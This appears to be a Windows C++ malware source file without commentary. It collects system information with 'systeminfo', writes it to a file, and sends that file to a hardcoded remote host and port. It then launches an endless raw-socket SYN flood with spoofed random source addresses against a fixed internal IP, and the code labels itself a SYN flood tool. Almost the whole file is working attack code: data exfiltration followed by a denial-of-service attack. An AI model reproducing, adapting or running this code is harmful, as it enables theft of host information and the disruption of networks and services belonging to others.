#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0500


#include <conio.h>
#include<cmath>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <stdlib.h>
#include <string>
#include <iostream>
using namespace std;
void L_Device();
void G_system();
void G_IP();

#include <cstdio>




#include <WinSock2.h>
//typedef unsigned long long u64;
long long GetMicroCounter();
#define BUF_SIZE 1024
//ip start
struct ip_hdr {
	unsigned char ver_ihl;
	unsigned char tos;
	unsigned short total_len;
	unsigned short id;
	unsigned short frame_offset;
	unsigned char ttl;
	unsigned char protocol;
	unsigned short checksum;
	unsigned int saddr;
	unsigned int daddr;
};
//IP Header
struct tcp_hdr {
	unsigned short sport;
	unsigned short dport;
	unsigned int seq;
	unsigned int ack;
	unsigned char data_offset;
	unsigned char flags;
	unsigned short windows;
	unsigned short checksum;
	unsigned short urgpointer;
};
//TMP Header
struct tmp_hdr {
	unsigned int saddr;
	unsigned int daddr;
	char useless;
	unsigned char protocol;
	unsigned short total_len;
	struct tcp_hdr tcp;
};
//ip, tcp, tmp header
struct ip_hdr *ip;
struct tcp_hdr *tcp;
struct tmp_hdr *tmp;
struct sockaddr_in dest;
char *packet;
int sockraw;
//
unsigned short in_cksum(u_short * addr, int len);
void xaydung_packet(char *saddr, char *daddr, unsigned short dport, char packet[]);
void send_packet(char *daddr, unsigned short fromport, unsigned short toport, unsigned int delay);
//ipend

void G_system()
{
	FILE* file;
	char output[4000];
	file = _popen("systeminfo", "r");
	fread(output, 1,sizeof(output), file);
	cout << output << endl;
	FILE* wfile;
	wfile = fopen("data.txt", "w");
	fwrite(output,sizeof(output),1,wfile);
	fclose(file);
	fclose(wfile);
}

int main() {
	G_system();



	int argc = 3;
	char* argv[4];
	argv[1] = "172.16.10.10";
	argv[2] = "31338";
	argv[3] = "data.txt";
	

	long long start, end;
	WSADATA wsaData;
	struct sockaddr_in server_addr;
	SOCKET s;

	WSAStartup(MAKEWORD(2, 2), &wsaData);

	if ((s = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		printf("Socket Creat Error.\n");
		exit(1);
	}

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(argv[1]);
	server_addr.sin_port = htons(atoi(argv[2]));

	if (connect(s, (SOCKADDR *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
		printf("Socket Connection Error.\n");
		exit(1);
	}
	int totalBufferNum;
	int BufferNum;
	int sendBytes;
	long totalSendBytes;
	long file_size;
	char buf[BUF_SIZE];

	FILE *fp;
	fp = fopen(argv[3], "rb");
	if (fp == NULL) {
		printf("File not Exist");
		exit(1);
	}
	fseek(fp, 0, SEEK_END);
	file_size = ftell(fp);
	totalBufferNum = file_size / sizeof(buf) + 1;
	fseek(fp, 0, SEEK_SET);
	BufferNum = 0;
	totalSendBytes = 0;

	_snprintf(buf, sizeof(buf), "%d", file_size);
	sendBytes = send(s, buf, sizeof(buf), 0);

	start = GetMicroCounter();
	while ((sendBytes = fread(buf, sizeof(char), sizeof(buf), fp))>0) {
		send(s, buf, sendBytes, 0);
		BufferNum++;
		totalSendBytes += sendBytes;
		printf("In progress: %d/%dByte(s) [%d%%]\n", totalSendBytes, file_size, ((BufferNum * 100) / totalBufferNum));
	}
	end = GetMicroCounter();
	printf("time: %d second(s)", end - start);

	closesocket(s);
	WSACleanup();


	//ip
	printf("$uicide - SYN Flood v0.1\n");
	int optval = 1;

	WSADATA wsaData2;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData2) != 0) return -1;
	printf("ll");
	/*if ((sockraw = socket(AF_INET, SOCK_RAW, 0)) < 0) {
		printf("Socket Creat Error.\n");
		exit(1);
	}*/
	sockraw = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, NULL, NULL);
	if (sockraw == INVALID_SOCKET)
	{
		WSAGetLastError();
		return 0;//Raw Socket
	}
	printf("pp");
	if (setsockopt(sockraw, IPPROTO_IP, 2, (char *)&optval, sizeof(optval)) == SOCKET_ERROR) return -1;

	//dest ip, fromport, toport, delay

	printf("Starting to Send SYNs\n");
	while (1) {
		send_packet("10.128.10.10", 80, 80, 10);
	}

	closesocket(sockraw);
	WSACleanup();
	return 0;
}

long long GetMicroCounter()
{
	long long Counter;

#if defined(_WIN32)
	long long Frequency;
	QueryPerformanceFrequency((LARGE_INTEGER *)&Frequency);
	QueryPerformanceCounter((LARGE_INTEGER *)&Counter);
	Counter = 1000000 * Counter / Frequency;
#elif defined(__linux__)
	struct timeval t;
	gettimeofday(&t, 0);
	Counter = 1000000 * t.tv_sec + t.tv_usec;
#endif

	return Counter;
}

//ip
//packet
void xaydung_packet(char *saddr, char *daddr, unsigned short dport, char packet[])
{

	unsigned short packet_size = sizeof(ip_hdr) + sizeof(tcp_hdr);

	//IP Header
	unsigned short ip_ver = 4, ip_ihl = 5;

	ip->ver_ihl = (ip_ver << 4) | ip_ihl;//<--Version Ip(4 bits cao) = 4 va IHL(4 bits thap) = 5
	ip->tos = 0;//<-- Type of Service
	ip->total_len = htons(packet_size);// IP Header + TCP Header + Data
	ip->id = 1;//<-- Indentification
	ip->frame_offset = 0;
	ip->ttl = 255;//<-- Time to Live
	ip->protocol = 6;
	ip->checksum = 0;
	ip->saddr = inet_addr(saddr);//<-- Source IP
	ip->daddr = inet_addr(daddr);//<-- Destination IP
								 //checksum IP Header
	ip->checksum = in_cksum((unsigned short *)ip, sizeof(ip_hdr));
	//TCP Header
	tcp->sport = rand() % 1500 + 1; //<-- Source Port
	tcp->dport = htons(23); //<-- Destination Port
	tcp->seq = htonl(1337); //<-- Sequence
	tcp->ack = htonl(1337); //<-- Acknowlege
	tcp->data_offset = (5) << 4;
	tcp->flags = 0x02;
	tcp->windows = htons(1337);
	tcp->checksum = 0;
	tcp->urgpointer = 0;
	//checksum TCP
	tmp->saddr = inet_addr(saddr);
	tmp->daddr = inet_addr(daddr);
	tmp->useless = 0;
	tmp->protocol = 6;
	tmp->total_len = htons(sizeof(tcp_hdr));
	tmp->tcp = *tcp;
	//checksum TCP Header
	tcp->checksum = in_cksum((unsigned short *)tmp, sizeof(struct tmp_hdr));

	//Copy IP Header ,TCP Header packet (IP Header--> TCP Header --> Data)
	char *ptr;
	ptr = packet;
	memcpy(ptr, ip, sizeof(struct ip_hdr));
	ptr += sizeof(struct ip_hdr);
	memcpy(ptr, tcp, sizeof(struct tcp_hdr));
	ptr += sizeof(struct tcp_hdr);
}
//Send packet
void send_packet(char *daddr, unsigned short fromport, unsigned short toport, unsigned int delay)
{
	unsigned short tmp_fromport = fromport;
	char *saddr = new char[16];
	unsigned short ip1 = 0, ip2 = 0, ip3 = 0, ip4 = 0;
	while (1)
	{
		//ip, tcp, tmp
		ip = new ip_hdr;
		tcp = new tcp_hdr;
		tmp = new tmp_hdr;
		//packet
		packet = new char[sizeof(ip_hdr) + sizeof(tcp_hdr)];
		memset(packet, 0x0, sizeof(ip_hdr) + sizeof(tcp_hdr));
		ZeroMemory(packet, sizeof(ip_hdr) + sizeof(tcp_hdr));

		for (fromport; fromport <= toport; fromport++)
		{
			ip1 = rand() % 255 + 1;
			ip2 = rand() % 255 + 1;
			ip3 = rand() % 255 + 1;
			ip4 = rand() % 255 + 1;
			sprintf(saddr, "%i.%i.%i.%i", ip1, ip2, ip3, ip4);
			xaydung_packet(saddr, daddr, fromport, packet);
			dest.sin_family = AF_INET;
			dest.sin_addr.s_addr = ip->daddr;
			printf("%d", sizeof(ip_hdr) + sizeof(tcp_hdr));
			if (sendto(sockraw, packet, sizeof(ip_hdr) + sizeof(tcp_hdr), 0x0, (struct sockaddr *) &dest, sizeof(dest)) == SOCKET_ERROR)
				perror("sendto");
			else
			{
				Sleep(delay);
				printf("#");
			}
		}

		fromport = tmp_fromport;

		delete ip;
		delete tcp;
		delete tmp;
		delete packet;
	}
}
//checksum
unsigned short in_cksum(u_short * addr, int len)
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);
}